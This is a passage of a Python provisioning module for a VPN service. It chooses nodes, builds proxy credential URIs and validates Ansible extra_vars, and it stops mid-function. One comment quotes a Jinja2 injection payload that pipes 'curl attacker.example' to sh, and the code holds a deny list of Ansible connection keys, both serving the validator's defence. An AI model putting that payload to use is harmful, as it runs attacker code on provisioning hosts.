"""Provisioning orchestration and helpers."""
from __future__ import annotations

import ipaddress
import json
import logging
import os
import re
import secrets
import threading
import uuid
from datetime import datetime, timedelta
from types import SimpleNamespace
from urllib.parse import quote as urlquote

from ..time_utils import utcnow
from typing import Any

from prometheus_client import Counter
from sqlalchemy import case, func
from sqlalchemy.exc import IntegrityError
from sqlalchemy.orm import Session

from .. import models
from ..db import SessionLocal
from ..security import compute_client_id_hmac, decrypt, encrypt
from .ansible_runner import (
    AnsibleCancelled,
    build_inventory_for_exit_node,
    build_inventory_for_node,
    build_inventory_for_relay_link_diagnose,
    run_playbook,
    set_active_cancel_check,
)
from .relay import (
    build_xray_relay_outbounds,
    choose_exit_for_relay,
    primary_wg_interface,
    resolve_exit_interface,
)

logger = logging.getLogger(__name__)
TASK_STATUS_COUNTER = Counter("vpn_provisioning_tasks_total", "Provisioning tasks processed", ["status"])

MAX_CONCURRENT_ANSIBLE = int(os.getenv("MAX_CONCURRENT_ANSIBLE", "3"))
_ansible_semaphore = threading.Semaphore(MAX_CONCURRENT_ANSIBLE)

MIN_HEALTHY_SCORE = int(os.getenv("MIN_HEALTHY_SCORE", "50"))


# ── Node selection ────────────────────────────────────────────────────

def choose_node(
    db: Session,
    plan: models.Plan,
    node_id: int | None = None,
    *,
    exclude_node_ids: list[int] | None = None,
    exclude_regions: list[str] | None = None,
) -> models.VPNNode:
    """Pick a VPN node, respecting plan pools, capacity, health and cooldown.

    Uses SELECT FOR UPDATE SKIP LOCKED to prevent concurrent provisioners
    from over-committing a single node.
    """
    now = utcnow()
    query = db.query(models.VPNNode).filter(models.VPNNode.is_active.is_(True))

    if node_id:
        node = query.filter(models.VPNNode.id == node_id).first()
        if not node:
            raise RuntimeError("Requested node is not active or missing")
        return node

    pools = plan.server_pools or []
    if pools:
        pool_ids = [p.id for p in pools]
        query = query.filter(models.VPNNode.pool_id.in_(pool_ids))

    if exclude_node_ids:
        query = query.filter(~models.VPNNode.id.in_(exclude_node_ids))

    if exclude_regions:
        query = query.filter(~models.VPNNode.region.in_(exclude_regions))

    query = query.filter(
        (models.VPNNode.cooldown_until.is_(None))
        | (models.VPNNode.cooldown_until < now)
    )
    # Exclude nodes the operator marked "руки прочь": legacy combined mute
    # (auto_diagnose_disabled_at) or the new hard diagnostics toggle
    # (diagnostics_disabled_at, migration 0039). Mirrors
    # failover.select_target_node + is_diagnostics_disabled so a disabled /
    # crowd-cooled node never receives new users. getattr-guard for pre-0039.
    for _disabled_col in (
        getattr(models.VPNNode, "auto_diagnose_disabled_at", None),
        getattr(models.VPNNode, "diagnostics_disabled_at", None),
    ):
        if _disabled_col is not None:
            query = query.filter(_disabled_col.is_(None))
    query = query.filter(
        models.VPNNode.status.in_(
            [models.VPNNodeStatus.active, models.VPNNodeStatus.registering]
        )
    )
    query = query.filter(
        (models.VPNNode.health_score.is_(None))
        | (models.VPNNode.health_score >= MIN_HEALTHY_SCORE)
    )

    # Stage 7 — capacity is counted in **devices**, not subscriptions.
    # A Family sub with 3 active devices puts 3× the load on the node
    # vs. a Solo sub with 1 device, so ``max_users`` must be the device
    # ceiling (the column name is historical). Devices in revoked /
    # disabled state don't consume node resources and are excluded.
    active_device_count = func.count(models.Device.id).label("active_devices")
    rows = (
        query.outerjoin(
            models.Subscription,
            (models.Subscription.node_id == models.VPNNode.id)
            & (models.Subscription.status == models.SubscriptionStatus.active),
        )
        .outerjoin(
            models.Device,
            (models.Device.subscription_id == models.Subscription.id)
            & (models.Device.status.notin_(
                [models.DeviceStatus.revoked, models.DeviceStatus.disabled]
            )),
        )
        .group_by(models.VPNNode.id)
        .order_by(active_device_count.asc())
        .with_entities(models.VPNNode, active_device_count)
        .all()
    )

    for node, devs in rows:
        if node.max_users is not None and devs >= node.max_users:
            continue
        locked = (
            db.query(models.VPNNode)
            .filter(models.VPNNode.id == node.id)
            .with_for_update(skip_locked=True)
            .one_or_none()
        )
        if locked is None:
            continue
        if locked.max_users is not None:
            live_devices = (
                db.query(func.count(models.Device.id))
                .join(
                    models.Subscription,
                    models.Subscription.id == models.Device.subscription_id,
                )
                .filter(
                    models.Subscription.node_id == locked.id,
                    models.Subscription.status == models.SubscriptionStatus.active,
                    models.Device.status.notin_(
                        [models.DeviceStatus.revoked, models.DeviceStatus.disabled]
                    ),
                )
                .scalar()
                or 0
            )
            if live_devices >= locked.max_users:
                continue
        return locked

    raise RuntimeError("No healthy VPN nodes available for plan")


def choose_config(
    node: models.VPNNode, preferred_protocol: models.VPNConfigProtocol | None = None
) -> models.VPNConfig:
    configs = [cfg for cfg in node.configs if cfg.is_enabled]
    if preferred_protocol:
        filtered = [cfg for cfg in configs if cfg.protocol == preferred_protocol]
        if filtered:
            return filtered[0]
    if not configs:
        raise RuntimeError("No enabled VPN configs found for node")
    return configs[0]


# ── Credential builders ──────────────────────────────────────────────

def _build_shadowtls_credential(
    node: models.VPNNode, config: models.VPNConfig, username: str, password: str
) -> str:
    """Build a Hiddify-importable ShadowTLS+SS2022 URI.

    ``username``/``password`` are kept in the signature for parity with
    other credential builders but are not embedded — the v1 node layout
    uses a single shared SS password + shadow-tls password per node,
    both read from ``config.settings`` (encrypted at rest). When we move
    to SS2022 EIH multi-user, ``password`` will become the per-device
    identity key and this builder will append it to the userinfo blob.
    """
    from . import shadowtls as _stls
    settings = config.settings or {}
    ss_password_enc = settings.get("ss_password_enc")
    stls_password_enc = settings.get("shadowtls_password_enc")
    if not ss_password_enc or not stls_password_enc:
        raise RuntimeError(
            "ShadowTLS config is missing node-level secrets; reprovision the node"
        )
    return _stls.build_credential(
        host=node.host,
        port=config.port,
        ss_password=decrypt(ss_password_enc),
        shadowtls_password=decrypt(stls_password_enc),
        handshake_domain=config.sni or _stls.DEFAULT_HANDSHAKE_DOMAIN,
        name=f"shadowtls-{node.region}-{username}",
    )


# uTLS ClientHello fingerprint для vless-кредов. RKN-DPI (июнь-2026) флагует
# chrome/safari/ios; firefox/edge/android — проходят. НЕ ставить randomized:
# смена fp во время блока = +600с штрафа по алгоритму РКН. Меняется тут одним
# местом, раскатывается тихо через bulk-rebuild-config (без ротации токена).
_VLESS_UTLS_FP = "firefox"

# xray-ws (ws-cdn) sits on this loopback port; nginx :443 fronts it and
# proxies the WS path here. Internal only — never client-facing.
_WS_CDN_LOOPBACK_PORT = 10444


def _build_vless_reality_credential(
    node: models.VPNNode, config: models.VPNConfig, user_id: str
) -> str:
    settings = config.settings or {}
    sni = config.sni or settings.get("server_name", "")
    params = {
        "encryption": "none",
        "security": "reality",
        "sni": sni,
        "pbk": config.public_key or settings.get("public_key", ""),
        "sid": settings.get("short_id", ""),
        "flow": "xtls-rprx-vision",
        "fp": _VLESS_UTLS_FP,
        "type": "tcp",
    }
    query = "&".join([f"{k}={v}" for k, v in params.items() if v])
    return f"vless://{user_id}@{node.host}:{config.port}?{query}#reality-{node.region}"


def _build_vless_ws_cdn_credential(
    node: models.VPNNode, config: models.VPNConfig, user_id: str
) -> str:
    """Build a VLESS+WebSocket+TLS connection URI served DIRECTLY by the node.

    ``host``/``sni`` are the minted ``*.wgse.info`` subdomain (config.sni),
    which is a DNS-only record pointing straight at the node — the client
    connects to the node directly on :443 and the node terminates TLS with
    its own Let's Encrypt cert. CF-proxying WS is dead (see project_cf_ws_cdn_dead).
    """
    settings = config.settings or {}
    cdn_domain = config.sni or settings.get("cdn_domain", "")
    path = settings.get("ws_path", "/ws")
    params = {
        "encryption": "none",  # mandatory in the VLESS URI — clients reject without it
        "security": "tls",
        "sni": cdn_domain,
        "fp": _VLESS_UTLS_FP,
        "type": "ws",
        "host": cdn_domain,
        "path": urlquote(path),
    }
    query = "&".join([f"{k}={v}" for k, v in params.items() if v])
    return f"vless://{user_id}@{cdn_domain}:{config.port}?{query}#ws-cdn-{node.region}"


def _build_hysteria2_credential(
    node: models.VPNNode, config: models.VPNConfig, password: str
) -> str:
    """Build a Hysteria2 URI.

    Format: ``hy2://password@host:port?sni=...&insecure=0#tag``
    """
    settings = config.settings or {}
    sni = config.sni or settings.get("sni", node.host)
    obfs = settings.get("obfs", "")
    obfs_password = settings.get("obfs_password", "")
    params = {"sni": sni}
    if obfs:
        params["obfs"] = obfs
        params["obfs-password"] = obfs_password
    query = "&".join([f"{k}={v}" for k, v in params.items() if v])
    return f"hy2://{password}@{node.host}:{config.port}?{query}#hy2-{node.region}"


def _build_vless_xhttp_credential(
    node: models.VPNNode, config: models.VPNConfig, user_id: str
) -> str:
    """Build a VLESS+XHTTP+TLS connection URI.

    XHTTP multiplexes VPN traffic through standard HTTP requests,
    bypassing ТСПУ's 16KB curtain on raw TLS tunnels.
    """
    settings = config.settings or {}
    domain = config.sni or settings.get("domain", node.host)
    path = settings.get("xhttp_path", "/xh")
    mode = settings.get("xhttp_mode", "auto")
    params = {
        "encryption": "none",
        "security": "tls",
        "sni": domain,
        "fp": _VLESS_UTLS_FP,
        "type": "xhttp",
        "host": domain,
        "path": urlquote(path),
        "mode": mode,
    }
    query = "&".join([f"{k}={v}" for k, v in params.items() if v])
    return f"vless://{user_id}@{domain}:{config.port}?{query}#xhttp-{node.region}"


# ── Extra vars collection for Ansible site.yml ────────────────────────

# Jinja2 template markers — any of these appearing in a value we pass
# via ``--extra-vars`` gets that value re-evaluated by the ansible role
# it lands in. That's the RCE path we have to close: an admin-scoped
# VPNConfig.settings payload like ``{"short_id": "{{ lookup('pipe',
# 'curl attacker.example | sh') }}"}`` would execute on the worker the
# first time any role references ``vless_reality_short_id``. ``json.dumps``
# protects against shell injection at the cli level but does nothing
# about Jinja2, which runs AFTER the JSON is decoded.
_JINJA_MARKERS: tuple[str, ...] = ("{{", "}}", "{%", "%}", "{#", "#}")

# Extra_vars names that ansible itself uses or reserves — an attacker
# that manages to sneak any of these into our extra dict could redirect
# SSH targets, private key paths, become users, etc. Defense-in-depth:
# our collector only writes hand-picked keys, so a breach of this list
# means a code bug upstream, not user input. But the check is free.
_FORBIDDEN_EXTRA_KEYS = frozenset(
    {
        "ansible_host",
        "ansible_port",
        "ansible_user",
        "ansible_connection",
        "ansible_ssh_private_key_file",
        "ansible_ssh_common_args",
        "ansible_ssh_extra_args",
        "ansible_become",
        "ansible_become_user",
        "ansible_become_method",
        "ansible_python_interpreter",
        "ansible_shell_executable",
        "hostvars",
        "groups",
        "group_names",
        "inventory_hostname",
    }
)


def _validate_extra_vars(extra: dict[str, Any], *, node_hint: str) -> None:
    """Defence-in-depth check before we hand ``extra`` to ansible.

    Rejects values that would open Jinja2 template injection, newline
    injection, or that use an ansible-reserved key name. Only string
    values are scanned for markers — ints, lists of ints and bools pass
    straight through (no template evaluation on non-strings).

    ``node_hint`` is embedded in the error for operator triage (so a
    failing task in /admin/tasks names the node whose config is bad).

    Raises :class:`ValueError` with the first offending key+reason so
    the provisioning task fails loudly rather than silently running a
    poisoned playbook.
    """
    for key, value in extra.items():
        if key in _FORBIDDEN_EXTRA_KEYS:
            raise ValueError(
                f"extra_vars for node {node_hint}: key {key!r} is reserved by ansible"
            )
        if isinstance(value, str):
            for marker in _JINJA_MARKERS:
                if marker in value:
                    raise ValueError(
                        f"extra_vars for node {node_hint}: key {key!r} contains "
                        f"Jinja2 marker {marker!r} — would be re-evaluated by ansible "
                        "and is a template-injection vector"
                    )
            if "\n" in value or "\r" in value:
                raise ValueError(
                    f"extra_vars for node {node_hint}: key {key!r} contains a "
                    "newline — rejected to prevent YAML corruption if the role "
                    "writes it to a config file"
                )
            if "\x00" in value:
                raise ValueError(
                    f"extra_vars for node {node_hint}: key {key!r} contains a "
                    "NUL byte"
                )


def _resolve_xray_mirror_url() -> str | None:
    """Mgmt-mirror base URL for ``xray-{geoip,core}-fetch.sh``.

    Provisioning runs against a single-node temp inventory
    (:func:`build_inventory_for_node`), so neither ``group_vars/all.yml``
    (which defines ``xray_mirror_url``) nor ``mgmt-1``'s hostvars are
    loaded — the group_vars value ``http://{{ hostvars['mgmt-1']... }}``
    would render undefined → empty ``MIRROR_URL``. We resolve the URL here
    and pass it as an ``--extra-var`` so the node's ``/etc/default/xray-mirror``
    gets a real value and the fetch wrappers try the mirror first (xray-core
    has NO jsdelivr fallback — without the mirror it dies on github timeout
    from blocked RU DCs).

    Order: ``XRAY_MIRROR_URL`` env (explicit) → ``http://<mgmt-1
    ansible_host>:<XRAY_MIRROR_PORT|8090>`` parsed from the prod inventory →
    ``None`` (wrappers fall back to ghproxy/github).
    """
    explicit = os.getenv("XRAY_MIRROR_URL")
    if explicit:
        return explicit.rstrip("/")

    mgmt = os.getenv("MGMT_HOST")
    if not mgmt:
        try:
            import yaml

            root = os.getenv("ANSIBLE_ROOT", "/app/infra/ansible")
            path = os.path.join(root, "inventories", "prod", "hosts.yml")
            with open(path) as fh:
                inv = yaml.safe_load(fh)
            mgmt = inv["all"]["children"]["db_host"]["hosts"]["mgmt-1"][
                "ansible_host"
            ]
        except Exception:  # noqa: BLE001
            return None
    if not mgmt:
        return None
    port = os.getenv("XRAY_MIRROR_PORT", "8090")
    return f"http://{mgmt}:{port}"


def _collect_site_extra_vars(
    db: Session, node: models.VPNNode
) -> dict[str, Any]:
    """Build extra_vars for a node-level site.yml run.

    Inspects all enabled VPNConfig rows on the node and surfaces the
    backend-authoritative secrets for each protocol to the installer roles.
    """
    extra: dict[str, Any] = {}

    # Mgmt-mirror URL for the xray geoip/core fetchers. The temp inventory
    # drops group_vars, so we inject it here — without it xray-core can't
    # install from a github-blocked RU DC. See _resolve_xray_mirror_url.
    mirror_url = _resolve_xray_mirror_url()
    if mirror_url:
        extra["xray_mirror_url"] = mirror_url
    # Ports the health-check role must see listening after site.yml
    # finishes. Built from the set of enabled VPNConfig rows so adding
    # or removing a protocol on the node automatically adjusts which
    # ports are considered "must be up". The default in the role is
    # [443, 8443, 9443] and was wrong for nodes that don't run every
    # protocol — those ports would never open and bootstrap failed.
    health_ports: list[int] = []
    for cfg in node.configs:
        if not cfg.is_enabled:
            continue
        settings = cfg.settings or {}

        # ── ShadowTLS v3 + shadowsocks-rust ──
        if cfg.protocol == models.VPNConfigProtocol.shadowtls_ss:
            from . import shadowtls as _stls
            ss_pwd_enc = settings.get("ss_password_enc")
            stls_pwd_enc = settings.get("shadowtls_password_enc")
            if not ss_pwd_enc or not stls_pwd_enc:
                continue
            extra.update({
                "shadowtls_port": cfg.port,
                "shadowtls_password": decrypt(stls_pwd_enc),
                "shadowtls_ss_password": decrypt(ss_pwd_enc),
                "shadowtls_handshake_domain": cfg.sni or _stls.DEFAULT_HANDSHAKE_DOMAIN,
            })
            health_ports.append(cfg.port)

        # ── VLESS Reality ──
        elif cfg.protocol == models.VPNConfigProtocol.vless_reality:
            priv_enc = settings.get("private_key_enc")
            if not priv_enc or not cfg.public_key:
                continue
            extra.update({
                "vless_reality_private_key": decrypt(priv_enc),
                "vless_reality_public_key": cfg.public_key,
                "vless_reality_short_id": settings.get("short_id", ""),
                "vless_reality_port": cfg.port,
                "vless_reality_sni": cfg.sni or "",
                "vless_reality_dest": settings.get("dest") or cfg.fallback or "",
            })
            health_ports.append(cfg.port)

        # ── VLESS+WS+CDN (DIRECT, no CF: nginx :443 LE → xray-ws loopback) ──
        elif cfg.protocol == models.VPNConfigProtocol.vless_ws_cdn:
            extra.update({
                "vless_ws_cdn_port": cfg.port,
                "vless_ws_cdn_domain": cfg.sni or "",  # minted *.wgse subdomain (DNS hook)
                "vless_ws_cdn_path": settings.get("ws_path", "/ws"),
                "vless_ws_cdn_loopback_port": settings.get(
                    "loopback_port", _WS_CDN_LOOPBACK_PORT
                ),
            })
            # No Origin CA: ws-cdn is served DIRECTLY (DNS-only, no CF proxy),
            # so the node obtains its own Let's Encrypt cert for the minted
            # *.wgse subdomain (role's certbot path runs when no cert given).
            # CF-proxying WS is dead — RKN kills the CF leg.
            health_ports.append(cfg.port)

        # ── VLESS+XHTTP (DIRECT+LE: auto *.wgse subdomain or explicit sni) ──
        elif cfg.protocol == models.VPNConfigProtocol.vless_xhttp:
            extra.update({
                "vless_xhttp_port": cfg.port,
                "vless_xhttp_domain": cfg.sni or "",
                "vless_xhttp_path": settings.get("xhttp_path", "/xh"),
                "vless_xhttp_mode": settings.get("xhttp_mode", "auto"),
            })
            # No Origin CA: every xhttp front (auto DNS-only on *.wgse OR an
            # explicit direct sni) is served DIRECTLY. Pass through pre-set
            # cert paths (legacy direct configs); else empty → the role's
            # certbot/LE path issues a cert for the subdomain. CF-proxying is
            # dead; the grwr.ink Origin-CA split is retired.
            extra["vless_xhttp_cert_path"] = settings.get("cert_path", "")
            extra["vless_xhttp_key_path"] = settings.get("key_path", "")
            health_ports.append(cfg.port)

        # ── Hysteria2 ──
        elif cfg.protocol == models.VPNConfigProtocol.hysteria2:
            extra.update({
                "hysteria2_port": cfg.port,
                "hysteria2_domain": cfg.sni or node.host,
                "hysteria2_obfs": settings.get("obfs", ""),
                "hysteria2_obfs_password": settings.get("obfs_password", ""),
                "hysteria2_cert_path": settings.get("cert_path", ""),
                "hysteria2_key_path": settings.get("key_path", ""),
                "hysteria2_up_mbps": settings.get("up_mbps", 100),
                "hysteria2_down_mbps": settings.get("down_mbps", 100),
            })
            # NB: Hysteria2 is UDP — ansible's wait_for module only does
            # TCP, so we intentionally skip adding it to vpn_health_ports.
            # Coverage for UDP liveness needs a separate check.

    if health_ports:
        extra["vpn_health_ports"] = sorted(set(health_ports))

    # ── Relay (jump node → per-link WG tunnel → exit) ──
    # G.5: source of truth is ``relay_exit_links``. One wg-quick@wgN
    # interface per link; the role loops over this list.
    relay_links = _build_relay_wg_links(db, node)
    if relay_links:
        # Validate string fields defensively (endpoint carries admin-
        # controlled host, decrypted keys come from our own security
        # module but still string-typed). Same rules as top-level keys.
        _validate_relay_link_strings(relay_links, node_hint=f"{node.id}/{node.name}")
        extra["relay_wg_links"] = relay_links
    else:
        # Empty result needs disambiguation before we hand the role an
        # authoritative "[] → tear down every tunnel". _build_relay_wg_links
        # returns [] for TWO very different states:
        #   1) genuinely zero RelayExitLink rows → this node has no tunnels →
        #      send [] so the role's DISABLE branch reconciles (real detach).
        #   2) link rows EXIST but every exit was skipped (missing
        #      wg_public_key — a transient/config error) → the live wg0 is
        #      still up. Sending [] here would rip down a working tunnel over
        #      a DB hiccup. Instead OMIT the key (undefined) so the role
        #      no-ops and leaves the tunnel intact, and log loudly.
        link_count = (
            db.query(func.count(models.RelayExitLink.id))
            .filter(models.RelayExitLink.relay_node_id == node.id)
            .scalar()
        ) or 0
        if link_count == 0:
            extra["relay_wg_links"] = []  # authoritative: node has no tunnels
        else:
            logger.warning(
                "node %s has %d relay link(s) but none yielded a usable WG "
                "config (exit missing wg_public_key?) — omitting relay_wg_links "
                "so a live tunnel is left intact instead of torn down",
                node.id, link_count,
            )

    # ── G.6: xray fan-out (multi-link only) ──
    # Emit every run so site.yml renders (or re-renders) both xray
    # outbounds + routing rules from the authoritative DB view. Empty
    # list on single-link/direct nodes — template skips the fan-out
    # block and just applies ``direct`` sockopt to the primary wgN
    # (if any). Relay with zero links returns ``None`` for primary —
    # template emits plain freedom without sockopt.
    primary_iface = primary_wg_interface(db, node.id)
    if primary_iface:
        extra["xray_primary_interface"] = primary_iface
    fan_out = build_xray_relay_outbounds(db, node)
    if fan_out:
        extra["xray_relay_outbounds"] = fan_out

    # #56 — last-line defence before this dict gets serialised to
    # --extra-vars. Catches admin-controlled values from VPNConfig.settings
    # that would weaponise an ansible role's ``{{ var }}`` usage. Runs
    # here (not in the caller) so every code path that builds site
    # extra_vars goes through it — including future ones.
    _validate_extra_vars(extra, node_hint=f"{node.id}/{node.name}")

    return extra


def _collect_exit_extra_vars(
    db: Session, exit_node: models.WGExitNode
) -> dict[str, Any]:
    """Build extra_vars for ``bootstrap_exit.yml`` on a WG exit node.

    Decrypts the server private key and walks every ``RelayExitLink``
    attached to this exit to produce the ``wg_exit_peers`` list the
    ``wg_exit_node`` role renders into ``/etc/wireguard/wg0.conf``. An
    empty list is legitimate (first bootstrap before any relay is
    attached) — the role assertion explicitly accepts it.
    """
    if not exit_node.wg_private_key_enc:
        raise RuntimeError(
            f"Exit node {exit_node.name} has no private key — "
            "generate one via POST /exits/{id}/keygen first"
        )
    links = (
        db.query(models.RelayExitLink)
        .filter(models.RelayExitLink.exit_id == exit_node.id)
        .all()
    )
    peers = [
        {
            "name": link.relay_node.name if link.relay_node else f"relay-{link.relay_node_id}",
            "public_key": link.wg_client_public_key,
            "allowed_ips_v4": link.wg_client_address_v4,
        }
        for link in links
    ]
    # Precompute the subnet for NAT masquerade. The role used to call
    # `ansible.utils.ipaddr('network/prefix')` but that collection isn't
    # shipped with the backend's Ansible, and adding it means another
    # image rebuild — cheaper to derive it here where we have Python's
    # stdlib. `ip_interface` accepts both "10.77.0.1/24" (host/prefix)
    # and bare IPs (treated as /32 — admin error, caller will see the
    # assertion fail when the wg interface won't come up).
    try:
        wg_exit_network_v4 = str(
            ipaddress.ip_interface(exit_node.wg_address_v4).network
        )
    except ValueError as exc:
        raise RuntimeError(
            f"Exit node {exit_node.name} has invalid "
            f"wg_address_v4={exit_node.wg_address_v4!r}: {exc}"
        ) from exc
    extra: dict[str, Any] = {
        "wg_exit_private_key": decrypt(exit_node.wg_private_key_enc),
        "wg_exit_peers": peers,
        "wg_exit_port": exit_node.wg_port,
        "wg_exit_address_v4": exit_node.wg_address_v4,
        "wg_exit_network_v4": wg_exit_network_v4,
    }
    # String values are scanned for Jinja2 markers / newlines; the peer
    # list is a list of dicts and skips the string branch. Defence-in-depth
    # — the only admin-controlled strings here are peer names, which the
    # relay node creation path already validates through the same regex
    # as the inventory builder.
    _validate_extra_vars(extra, node_hint=f"exit/{exit_node.id}/{exit_node.name}")
    return extra


def _build_relay_wg_links(
    db: Session, relay: models.VPNNode
) -> list[dict[str, Any]]:
    """Build the ``relay_wg_links`` list from ``RelayExitLink`` rows.

    Each entry carries everything the ``relay_jump_node`` role needs
    to render one ``wg-quick@wgN`` unit:

      * ``interface``       — kernel interface name (``wg0``, ``wg1``…)
      * ``private_key``     — plaintext WG private key (from Fernet)
      * ``address_v4``      — CIDR of the client endpoint (``.../32``)
      * ``endpoint``        — ``host:port`` of the matching exit
      * ``exit_public_key`` — exit's server public key

    Links whose exit is missing a ``wg_public_key`` are skipped
    (defensive — attach_relay refuses to create one without keygen
    first, but an orphaned row shouldn't sink the whole play).
    Empty list means "this node has no active tunnels" and puts the
    role into its teardown branch.
    """
    links = (
        db.query(models.RelayExitLink)
        .filter(models.RelayExitLink.relay_node_id == relay.id)
        .order_by(models.RelayExitLink.wg_interface_name)
        .all()
    )
    out: list[dict[str, Any]] = []
    for link in links:
        exit_node = link.exit_node
        if exit_node is None or not exit_node.wg_public_key:
            logger.warning(
                "relay %s link id=%s has no valid exit — skipping",
                relay.name, link.id,
            )
            continue
        out.append({
            "interface": link.wg_interface_name,
            "private_key": decrypt(link.wg_client_private_key_enc) or "",
            "address_v4": link.wg_client_address_v4,
            "endpoint": f"{exit_node.host}:{exit_node.wg_port}",
            "exit_public_key": exit_node.wg_public_key,
        })
    return out


def _validate_relay_link_strings(
    links: list[dict[str, Any]], *, node_hint: str
) -> None:
    """Run ``_validate_extra_vars`` over every stringy field in each link.

    The validator itself only walks top-level keys, so nested dicts in
    a list wouldn't be scanned. Flatten into ``relay_link_{i}_{field}``
    keys so any Jinja2/newline/NUL slip is caught before ansible sees
    the list.
    """
    flat: dict[str, Any] = {
        f"relay_link_{i}_{k}": v
        for i, link in enumerate(links)
        for k, v in link.items()
        if isinstance(v, str)
    }
    if flat:
        _validate_extra_vars(flat, node_hint=f"relay/{node_hint}")


def _collect_relay_tunnel_extra_vars(
    db: Session, relay: models.VPNNode
) -> dict[str, Any]:
    """Extra_vars for ``relay_tunnel_apply.yml`` on a relay jump node.

    The ``relay_jump_node`` role reads ``relay_wg_links`` (a list built
    from ``RelayExitLink`` rows): with one or more entries it brings
    each ``wg-quick@wgN`` up; with an empty list it tears every tunnel
    down. Detach flows hit the empty branch simply by having no links
    left for the relay.
    """
    links = _build_relay_wg_links(db, relay)
    _validate_relay_link_strings(links, node_hint=f"{relay.id}/{relay.name}")
    extra: dict[str, Any] = {"relay_wg_links": links}
    # G.6: relay_tunnel_apply.yml only runs the relay_jump_node role,
    # not site.yml — so any xray reconciliation the role does in its
    # multi-link branch needs these same extra_vars. The role keeps
    # xray outbounds + routing rules in sync with DB even when the
    # full install roles aren't rerun.
    primary_iface = primary_wg_interface(db, relay.id)
    if primary_iface:
        extra["xray_primary_interface"] = primary_iface
    fan_out = build_xray_relay_outbounds(db, relay)
    if fan_out:
        extra["xray_relay_outbounds"] = fan_out
    _validate_extra_vars(extra, node_hint=f"relay/{relay.id}/{relay.name}")
    return extra


def _generate_sub_token() -> str:
    """Generate a stable 22-char URL-safe subscription token."""
    return secrets.token_urlsafe(16)


# ── Orchestrator ─────────────────────────────────────────────────────

_VLESS_UUID_RE = re.compile(
    r"vless://([0-9a-fA-F-]{36})@",
)


# Protocols whose server-side client list lives in an xray config.json we can
# patch idempotently via manage_vless_*_user.sh. These all share the "invalid
# request user id" failure class when the DB and the node drift: if the user's
# UUID is in our DB as is_active/warm but missing from the node's config,
# xray rejects incoming handshakes. The resync pipeline must cover every
# entry in this set — omitting one is how the original single-protocol
# resync silently let xhttp/ws_cdn drift.
_VLESS_FAMILY_PROTOS: frozenset[str] = frozenset({
    models.VPNConfigProtocol.vless_reality.value,
    models.VPNConfigProtocol.vless_xhttp.value,
    models.VPNConfigProtocol.vless_ws_cdn.value,
})


def _node_has_vless_family(node: models.VPNNode) -> bool:
    """True iff the node serves at least one vless-family protocol.

    Gates the auto-resync after site.yml: nodes that only serve e.g.
    pure ShadowTLS don't need the resync helper playbook invoked on
    them (it would be a no-op but the extra ansible run is still wasted
    time on a success path).
    """
    for cfg in node.configs:
        if not cfg.is_enabled:
            continue
        if cfg.protocol.value in _VLESS_FAMILY_PROTOS:
            return True
    return False


def _extract_vless_uuid(config_text_enc: str) -> str | None:
    """Pull the user UUID out of an encrypted VLESS credential blob.

    Credentials are stored as encrypted ``vless://<uuid>@host:port?...``
    URIs — we don't have a dedicated column for the UUID, so the resync
    path has to parse it back out. Returns ``None`` if decryption or
    parsing fails, so a single corrupt row doesn't sink the whole batch.
    """
    try:
        uri = decrypt(config_text_enc)
    except Exception:  # noqa: BLE001
        return None
    match = _VLESS_UUID_RE.match(uri)
    return match.group(1) if match else None


def _device_vless_uuid(device: models.Device) -> str | None:
    """Return the VLESS user UUID currently bound to ``device``.

    Walks ``device.credentials`` until it finds a vless-family row whose
    encrypted ``config_text`` parses cleanly. Used by migrate paths so
    the new device on the target node inherits the old UUID — without
    this, every relay move forces installed clients to refetch and
    rebind, which is the bug this helper exists to nail down.
    """
    for cred in device.credentials:
        if cred.proto in _VLESS_FAMILY_PROTOS:
            extracted = _extract_vless_uuid(cred.config_text)
            if extracted:
                return extracted
    return None


class ProvisioningOrchestrator:
    """Coordinates provisioning tasks and Ansible execution."""

    def __init__(self, db: Session):
        self.db = db

    def create_task(
        self,
        target_type: str,
        target_id: int,
        action: str,
        payload: dict[str, Any] | None,
        *,
        batch_id: uuid.UUID | None = None,
    ) -> models.ProvisioningTask:
        task = models.ProvisioningTask(
            target_type=target_type,
            target_id=target_id,
            action=action,
            payload=payload or {},
            status=models.ProvisioningTaskStatus.pending,
            batch_id=batch_id,
        )
        self.db.add(task)
        self.db.flush()
        return task

    @staticmethod
    def _reconciler_enabled() -> bool:
        return os.getenv("RECONCILER_ENABLED", "").lower() in {"1", "true", "yes"}

    def mark_node_dirty(
        self, node: models.VPNNode, *, delay_s: float | None = None
    ) -> None:
        """Phase 3: «ноде нужен reconcile» — атомарно бампаем
        desired_generation и ставим reconcile_due_at = now + debounce. Правка
        НЕ диспатчит bootstrap сразу; reconcile-тик сойдёт ноду ОДНИМ прогоном
        после того, как burst правок осядет. UPDATE статeless (выражение
        desired_generation+1 в SQL) — без гонок read-modify-write."""
        if delay_s is None:
            delay_s = float(os.getenv("RECONCILE_DEBOUNCE_S", "5"))
        self.db.query(models.VPNNode).filter(
            models.VPNNode.id == node.id
        ).update(
            {
                models.VPNNode.desired_generation:
                    models.VPNNode.desired_generation + 1,
                models.VPNNode.reconcile_due_at:
                    utcnow() + timedelta(seconds=delay_s),
            },
            synchronize_session=False,
        )
        self.db.flush()

    def create_or_coalesce_node_bootstrap(
        self,
        node: models.VPNNode,
        payload: dict[str, Any] | None,
        *,
        batch_id: uuid.UUID | None = None,
        defer_to_reconciler: bool = True,
    ) -> tuple[models.ProvisioningTask | None, bool]:
        """Phase-0 coalescing: ≤1 активный (pending|running) bootstrap на ноду.

        Активный bootstrap уже есть → ставим ``rerun_requested`` на нём (worker
        создаст один свежий на финише) и возвращаем (existing, False). Иначе
        создаём новый → (task, True). Вызывающий делает ``run_task_async``
        ТОЛЬКО при created=True.

        DB-инвариант держит partial unique index uq_active_node_bootstrap
        (миграция 0041); гонку конкурентных insert'ов ловим savepoint'ом.

        Phase 3: при defer_to_reconciler=True (дефолт — все edit-сайты) и
        включённом RECONCILER_ENABLED правка НЕ создаёт таску сразу — бампаем
        desired_generation, reconcile-тик сойдёт ноду. Сам тик / rerun-хук /
        явный requeue зовут с defer_to_reconciler=False (им надо реально
        создать+задиспатчить). См. reconciler_epic.md.
        """
        if defer_to_reconciler and self._reconciler_enabled():
            self.mark_node_dirty(node)
            return None, False

        def _find_active() -> models.ProvisioningTask | None:
            return (
                self.db.query(models.ProvisioningTask)
                .filter(
                    models.ProvisioningTask.target_type == "node",
                    models.ProvisioningTask.target_id == node.id,
                    models.ProvisioningTask.action == "bootstrap",
                    models.ProvisioningTask.status.in_(
                        (
                            models.ProvisioningTaskStatus.pending,
                            models.ProvisioningTaskStatus.running,
